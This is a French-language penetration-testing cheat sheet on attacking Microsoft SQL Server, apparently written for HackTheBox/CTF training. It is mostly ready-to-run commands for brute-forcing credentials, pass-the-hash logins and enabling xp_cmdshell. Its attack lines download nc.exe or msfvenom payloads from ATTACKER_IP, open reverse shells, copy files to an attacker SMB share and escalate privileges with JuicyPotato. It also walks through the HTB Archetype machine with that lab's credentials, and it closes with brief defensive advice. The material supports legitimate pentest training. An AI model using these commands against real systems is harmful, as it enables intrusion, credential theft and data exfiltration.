# üóÑÔ∏è √ânum√©ration MSSQL (Microsoft SQL Server)

[‚Üê Retour √† la table des mati√®res](../README.md)

## üìã Table des Mati√®res
- [Informations g√©n√©rales](#informations-g√©n√©rales)
- [√ânum√©ration avec Nmap](#√©num√©ration-avec-nmap)
- [Impacket - mssqlclient.py](#impacket---mssqlclientpy-)
- [Metasploit Modules](#metasploit-modules)
- [Bruteforce](#bruteforce)
- [Exploitation](#exploitation)
- [Workflow d'attaque](#workflow-dattaque)

---

## Informations g√©n√©rales

**Port par d√©faut :** 1433 (TCP)  
**Service :** Microsoft SQL Server (MSSQL)  
**Environnement :** Windows, Active Directory

---

## √ânum√©ration avec Nmap

```bash
# D√©tection de version MSSQL
nmap -sV -p 1433 TARGET_IP

# Scripts NSE MSSQL
nmap --script ms-sql-info -p 1433 TARGET_IP
nmap --script ms-sql-config --script-args mssql.username=sa,mssql.password=password -p 1433 TARGET_IP
nmap --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=password -p 1433 TARGET_IP
nmap --script ms-sql-empty-password -p 1433 TARGET_IP
nmap --script ms-sql-ntlm-info -p 1433 TARGET_IP
```

---

## Impacket - mssqlclient.py ‚≠ê

**L'outil de r√©f√©rence pour MSSQL en pentest !**

### Connexions basiques
```bash
# Connexion avec credentials
impacket-mssqlclient username:password@IP

# Avec authentification Windows (Active Directory)
impacket-mssqlclient DOMAIN/username:password@IP -windows-auth

# Avec hash NTLM (Pass-the-Hash)
impacket-mssqlclient DOMAIN/username@IP -hashes :NTHASH -windows-auth

# Port personnalis√©
impacket-mssqlclient username:password@IP -port 1435

# Base de donn√©es sp√©cifique
impacket-mssqlclient username:password@IP -db master
```

### Exemple HTB Archetype
```bash
# Connexion
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth

# Une fois connect√©
SQL> SELECT @@version;                    # Version
SQL> SELECT name FROM sys.databases;      # Lister les bases
SQL> SELECT SYSTEM_USER;                  # User actuel
SQL> SELECT IS_SRVROLEMEMBER('sysadmin'); # V√©rifier si sysadmin
```

### Ex√©cution de commandes (xp_cmdshell) ‚≠ê
```bash
# Activer xp_cmdshell (n√©cessite sysadmin)
SQL> ENABLE_xp_cmdshell

# Ex√©cuter des commandes Windows
SQL> xp_cmdshell "whoami"
SQL> xp_cmdshell "hostname"
SQL> xp_cmdshell "net user"
SQL> xp_cmdshell "type C:\Users\sql_svc\Desktop\flag.txt"

# Download de fichiers
SQL> xp_cmdshell "powershell -c wget http://ATTACKER_IP/nc.exe -o C:\Windows\Temp\nc.exe"

# Reverse shell
SQL> xp_cmdshell "C:\Windows\Temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

### Commandes SQL utiles
```bash
# √ânum√©ration des bases de donn√©es
SQL> SELECT name FROM sys.databases;
SQL> USE database_name;

# √ânum√©ration des tables
SQL> SELECT * FROM INFORMATION_SCHEMA.TABLES;
SQL> SELECT table_name FROM information_schema.tables;

# Lire des credentials
SQL> SELECT * FROM users;
SQL> SELECT username, password FROM accounts;

# Lire des fichiers (si permissions)
SQL> SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x;

# V√©rifier les permissions
SQL> SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

üîó **Guide complet :** [Impacket - mssqlclient.py](../06-tools/impacket.md#mssqlclientpy---microsoft-sql-server-)

---

## Metasploit Modules

### √ânum√©ration de version
```bash
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS TARGET_IP
run
```

### Bruteforce de credentials
```bash
use auxiliary/scanner/mssql/mssql_login
set RHOSTS TARGET_IP
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set STOP_ON_SUCCESS true
run
```

### √ânum√©ration de la base
```bash
use auxiliary/admin/mssql/mssql_enum
set RHOSTS TARGET_IP
set USERNAME sa
set PASSWORD password
run
```

### Ex√©cution de commandes SQL
```bash
use auxiliary/admin/mssql/mssql_sql
set RHOSTS TARGET_IP
set USERNAME sa
set PASSWORD password
set SQL SELECT @@version;
run
```

### Ex√©cution de commandes syst√®me
```bash
use auxiliary/admin/mssql/mssql_exec
set RHOSTS TARGET_IP
set USERNAME sa
set PASSWORD password
set CMD whoami
run
```

### Autres modules utiles
```bash
use auxiliary/admin/mssql/mssql_enum_sql_logins  # √ânum√©rer les logins SQL
use auxiliary/admin/mssql/mssql_findandsampledata # Trouver des donn√©es sensibles
use auxiliary/scanner/mssql/mssql_hashdump        # Dumper les hashes
use exploit/windows/mssql/mssql_payload           # Payload via MSSQL
```

---

## Bruteforce

### Avec Hydra ‚Üí [üìñ Guide Hydra](../06-tools/hydra.md)
```bash
# Bruteforce basique
hydra -L users.txt -P passwords.txt TARGET_IP mssql

# Utilisateur sp√©cifique (sa = admin par d√©faut)
hydra -l sa -P /usr/share/wordlists/rockyou.txt TARGET_IP mssql

# Avec domaine Windows
hydra -l DOMAIN\\username -P passwords.txt TARGET_IP mssql
```

### Avec CrackMapExec ‚Üí [üìñ Guide CME](../06-tools/crackmapexec.md)
```bash
crackmapexec mssql TARGET_IP -u users.txt -p passwords.txt
crackmapexec mssql TARGET_IP -u sa -p password --continue-on-success
```

---

## Exploitation

### Sc√©nario 1 : xp_cmdshell pour reverse shell

```bash
# 1. Pr√©parer le payload (Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe

# 2. H√©berger le fichier
python3 -m http.server 80

# 3. D√©marrer le listener
nc -nvlp 4444

# 4. Via mssqlclient
impacket-mssqlclient DOMAIN/user:pass@TARGET_IP -windows-auth
SQL> ENABLE_xp_cmdshell
SQL> xp_cmdshell "powershell -c wget http://ATTACKER_IP/shell.exe -o C:\Windows\Temp\shell.exe"
SQL> xp_cmdshell "C:\Windows\Temp\shell.exe"
```

### Sc√©nario 2 : Exfiltration via MSSQL

```bash
# Lire des fichiers sensibles
SQL> xp_cmdshell "type C:\inetpub\wwwroot\web.config"
SQL> xp_cmdshell "type C:\Users\Administrator\Desktop\flag.txt"

# Exfiltrer vers serveur SMB (Impacket smbserver)
# Sur Kali
impacket-smbserver share $(pwd) -smb2support

# Via MSSQL
SQL> xp_cmdshell "copy C:\Users\Administrator\Desktop\flag.txt \\ATTACKER_IP\share\flag.txt"
```

### Sc√©nario 3 : √âl√©vation de privil√®ges

```bash
# Si compte MSSQL a des privil√®ges SeImpersonatePrivilege
SQL> xp_cmdshell "whoami /priv"

# Upload et ex√©cution de JuicyPotato / PrintSpoofer
SQL> xp_cmdshell "powershell -c wget http://ATTACKER_IP/JuicyPotato.exe -o C:\Temp\jp.exe"
SQL> xp_cmdshell "C:\Temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a '/c C:\Temp\shell.exe' -t *"
```

üîó **Voir :** [Windows PrivEsc](../05-post-exploitation/windows-privesc.md)

---

## Workflow d'attaque

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  1. D√âCOUVERTE                              ‚îÇ
‚îÇ  nmap -sV -p 1433 TARGET_IP                 ‚îÇ
‚îÇ  nmap --script ms-sql-info -p 1433 IP      ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                   ‚îÇ
                   ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  2. BRUTEFORCE / CREDENTIALS                ‚îÇ
‚îÇ  hydra -l sa -P rockyou.txt IP mssql        ‚îÇ
‚îÇ  OU credentials trouv√©s ailleurs            ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                   ‚îÇ
                   ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  3. CONNEXION                               ‚îÇ
‚îÇ  impacket-mssqlclient user:pass@IP          ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                   ‚îÇ
                   ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  4. √âNUM√âRATION                             ‚îÇ
‚îÇ  SELECT @@version;                          ‚îÇ
‚îÇ  SELECT IS_SRVROLEMEMBER('sysadmin');       ‚îÇ
‚îÇ  SELECT name FROM sys.databases;            ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                   ‚îÇ
                   ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  5. ACTIVATION xp_cmdshell                  ‚îÇ
‚îÇ  ENABLE_xp_cmdshell                         ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                   ‚îÇ
                   ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  6. EXPLOITATION                            ‚îÇ
‚îÇ  - Ex√©cuter commandes (whoami, net user)    ‚îÇ
‚îÇ  - Download de payloads                     ‚îÇ
‚îÇ  - Reverse shell                            ‚îÇ
‚îÇ  - Exfiltration de donn√©es                  ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                   ‚îÇ
                   ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  7. POST-EXPLOITATION                       ‚îÇ
‚îÇ  - √ânum√©ration syst√®me Windows              ‚îÇ
‚îÇ  - √âl√©vation de privil√®ges                  ‚îÇ
‚îÇ  - Pivoting vers autres machines            ‚îÇ
‚îÇ  - Dump de credentials (mimikatz, etc.)     ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

## üéØ WORKFLOW TYPIQUE HTB/CTF

Ce workflow repr√©sente un sc√©nario d'attaque complet, du scan initial √† l'obtention du flag root.

```bash
# 1Ô∏è‚É£ √âNUM√âRATION INITIALE
nmap -p 445,1433,5985 IP

# R√©sultats typiques :
# 445/tcp   open  microsoft-ds    # SMB
# 1433/tcp  open  ms-sql-s        # MSSQL
# 5985/tcp  open  wsman           # WinRM

# 2Ô∏è‚É£ CONNEXION √Ä MSSQL (avec credentials trouv√©s)
impacket-mssqlclient DOMAIN/user:password@IP -windows-auth

# Exemple concret (HTB Archetype) :
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth

# 3Ô∏è‚É£ V√âRIFICATION DES PRIVIL√àGES
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
# R√©sultat : 1 = sysadmin (jackpot!)
# R√©sultat : 0 = pas sysadmin (limit√©)

# 4Ô∏è‚É£ ACTIVATION DE xp_cmdshell (n√©cessite sysadmin)
SQL> ENABLE_xp_cmdshell

# 5Ô∏è‚É£ √âNUM√âRATION SYST√àME
SQL> xp_cmdshell "whoami"
# Exemple : archetype\sql_svc

SQL> xp_cmdshell "hostname"
# Exemple : ARCHETYPE

SQL> xp_cmdshell "net user"
# Liste les utilisateurs locaux

# 6Ô∏è‚É£ RECHERCHE DE CREDENTIALS
# PowerShell history (tr√®s souvent utilis√© dans HTB!)
SQL> xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# R√©sultat typique :
# net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
# ‚Üí Password admin trouv√© : MEGACORP_4dm1n!!

# Autres fichiers int√©ressants :
SQL> xp_cmdshell "type C:\Users\sql_svc\Desktop\user.txt"    # Flag user
SQL> xp_cmdshell "dir C:\Users\sql_svc\Desktop"              # √ânum√©ration
SQL> xp_cmdshell "dir C:\Users\ /s /b"                       # Recherche r√©cursive

# 7Ô∏è‚É£ ESCALADE DE PRIVIL√àGES
# Une fois le password admin trouv√©, plusieurs options :

# Option A : Si WinRM (5985) ouvert ‚Üí Evil-WinRM (‚≠ê recommand√©)
evil-winrm -i 10.129.95.187 -u administrator -p 'MEGACORP_4dm1n!!'

# Option B : Si SMB (445) ouvert ‚Üí Impacket psexec
impacket-psexec administrator:MEGACORP_4dm1n!!@10.129.95.187

# Option C : Pass-the-Hash (si tu as dump√© des hashes)
evil-winrm -i IP -u administrator -H 'NTHASH'
impacket-psexec administrator@IP -hashes :NTHASH

# 8Ô∏è‚É£ R√âCUP√âRATION DU FLAG ROOT
# Via Evil-WinRM ou PSExec :
C:\> type C:\Users\Administrator\Desktop\root.txt
```

---

## üí° COMMANDES ESSENTIELLES - M√âMO RAPIDE

### Connexion et authentification
```bash
# MSSQL avec authentification Windows (le plus utilis√© dans CTF/AD)
impacket-mssqlclient DOMAIN/user:password@IP -windows-auth

# MSSQL avec authentification SQL standard
impacket-mssqlclient user:password@IP

# Avec hash NTLM (Pass-the-Hash)
impacket-mssqlclient DOMAIN/user@IP -hashes :NTHASH -windows-auth
```

### Commandes SQL de base
```sql
-- Informations syst√®me
SELECT @@version;                           -- Version SQL Server
SELECT SYSTEM_USER;                         -- Utilisateur actuel
SELECT IS_SRVROLEMEMBER('sysadmin');       -- V√©rifier si sysadmin (1=oui, 0=non)

-- √ânum√©ration des bases
SELECT name FROM sys.databases;
SELECT name FROM master.sys.databases;

-- Activer xp_cmdshell (n√©cessite sysadmin)
ENABLE_xp_cmdshell

-- Ou manuellement :
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### xp_cmdshell - Ex√©cution de commandes
```sql
-- √ânum√©ration de base
xp_cmdshell "whoami"
xp_cmdshell "hostname"
xp_cmdshell "ipconfig"
xp_cmdshell "net user"
xp_cmdshell "net localgroup administrators"

-- Lecture de fichiers
xp_cmdshell "type C:\Users\sql_svc\Desktop\user.txt"
xp_cmdshell "dir C:\Users\Administrator\Desktop"

-- PowerShell History (‚≠ê TR√àS IMPORTANT pour CTF/HTB!)
xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

-- Recherche de fichiers
xp_cmdshell "dir C:\Users\ /s /b | findstr flag"
xp_cmdshell "dir C:\Users\ /s /b | findstr password"
```

### Transfert de fichiers et reverse shell
```sql
-- T√©l√©charger nc.exe (netcat)
xp_cmdshell "powershell -c wget http://ATTACKER_IP/nc.exe -o C:\Windows\Temp\nc.exe"

-- T√©l√©charger WinPEAS pour √©num√©ration
xp_cmdshell "powershell -c wget http://ATTACKER_IP/winPEAS.exe -o C:\Temp\winPEAS.exe"

-- Reverse shell (apr√®s avoir lanc√© `nc -nvlp 4444` sur Kali)
xp_cmdshell "C:\Windows\Temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

### Shells Windows - Comparaison rapide
```bash
# Une fois credentials obtenus, choisir selon port ouvert :

# 1. WinRM (5985) ‚Üí Evil-WinRM (‚≠ê meilleur shell)
evil-winrm -i IP -u administrator -p 'password'

# 2. SMB (445) ‚Üí Impacket psexec
impacket-psexec administrator:password@IP

# 3. WMI (135) ‚Üí Impacket wmiexec (plus discret)
impacket-wmiexec administrator:password@IP

# 4. MSSQL (1433) ‚Üí xp_cmdshell (limit√© mais utile)
impacket-mssqlclient user:password@IP -windows-auth
SQL> xp_cmdshell "commandes..."
```

---

## üéØ Exemple complet - HTB Archetype

```bash
# 1. Scan initial
nmap -sV -p 1433 10.129.95.187

# 2. Credentials trouv√©s (SMB, fichier config, etc.)
# ARCHETYPE\sql_svc:M3g4c0rp123

# 3. Connexion MSSQL
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth

# 4. V√©rification des privil√®ges
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
# R√©sultat : 1 (on est sysadmin!)

# 5. Activation de xp_cmdshell
SQL> ENABLE_xp_cmdshell

# 6. √ânum√©ration
SQL> xp_cmdshell "whoami"
# R√©sultat : archetype\sql_svc

SQL> xp_cmdshell "hostname"
# R√©sultat : ARCHETYPE

# 7. Trouver le flag
SQL> xp_cmdshell "dir C:\Users\sql_svc\Desktop"
SQL> xp_cmdshell "type C:\Users\sql_svc\Desktop\user.txt"

# 8. Pour escalade de privil√®ges ‚Üí Reverse shell
# Sur Kali
nc -nvlp 4444

# T√©l√©charger nc.exe
SQL> xp_cmdshell "powershell -c wget http://10.10.14.5/nc.exe -o C:\Windows\Temp\nc.exe"

# Reverse shell
SQL> xp_cmdshell "C:\Windows\Temp\nc.exe 10.10.14.5 4444 -e cmd.exe"

# Shell obtenu ! ‚Üí winPEAS, mimikatz, etc.
```

---

## üîó Liens connexes

### Outils
- **[Impacket](../06-tools/impacket.md)** - Suite compl√®te (‚≠ê recommand√©)
- [Hydra](../06-tools/hydra.md) - Bruteforce
- [CrackMapExec](../06-tools/crackmapexec.md) - Spray de credentials

### √ânum√©ration
- [SMB/Samba](smb-samba.md) - Souvent associ√© √† MSSQL
- [WinRM](winrm.md) - Autre vecteur d'acc√®s Windows

### Exploitation
- [Windows Vulns](../04-exploitation/windows-vulns.md)
- [SQL Injection](../04-exploitation/sql-injection.md) - Web ‚Üí MSSQL

### Post-exploitation
- [Windows PrivEsc](../05-post-exploitation/windows-privesc.md)
- [Pivoting](../09-pivoting/)

### Payloads
- [Reverse Shells](../08-payloads/reverse-shells.md)
- [MSFVenom](../06-tools/msfvenom.md)

---

## üí° Points cl√©s √† retenir

### Configuration par d√©faut dangereuse
- ‚úÖ Compte `sa` (System Administrator) avec mot de passe faible ou vide
- ‚úÖ `xp_cmdshell` activ√© par d√©faut sur anciennes versions
- ‚úÖ Service MSSQL qui tourne avec `NT AUTHORITY\SYSTEM`

### D√©tection
```bash
# V√©rifier si MSSQL √©coute
netstat -ano | findstr :1433

# Processus MSSQL
tasklist | findstr sqlservr.exe

# Services
sc query MSSQLSERVER
```

### Bonnes pratiques d√©fensives
- ‚ùå Ne jamais laisser `sa` sans mot de passe
- ‚ùå D√©sactiver `xp_cmdshell` si non n√©cessaire
- ‚úÖ Restreindre l'acc√®s r√©seau √† MSSQL (firewall)
- ‚úÖ Utiliser des comptes de service avec privil√®ges minimaux
- ‚úÖ Activer l'audit des connexions SQL

---

## üéì Ressources

- **HackTheBox Machines :**
  - Archetype (facile, xp_cmdshell)
  - Sequel (facile, acc√®s root)
  - Querier (moyen, MSSQL + AD)

- **Documentation Microsoft :**
  - [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)
  - [SQL Server Security](https://docs.microsoft.com/en-us/sql/relational-databases/security/)

---

**üéì Prochaines √©tapes :**
- Ma√Ætriser **Impacket** pour Windows/AD
- Combiner MSSQL avec **SMB enumeration**
- √âtudier **SQL Injection** ‚Üí MSSQL
- Pratiquer **Pass-the-Hash** avec credentials dump√©s
